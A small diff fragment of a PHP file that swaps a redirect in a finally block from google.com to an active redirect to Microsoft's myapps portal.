@@ -38,8 +38,7 @@ try{
     ;
 }
 finally {
-	// header('Location: https://myapps.microsoft.com/');
-	header('Location: https://google.com/');
+	header('Location: https://myapps.microsoft.com/');
 }
 
 ?>
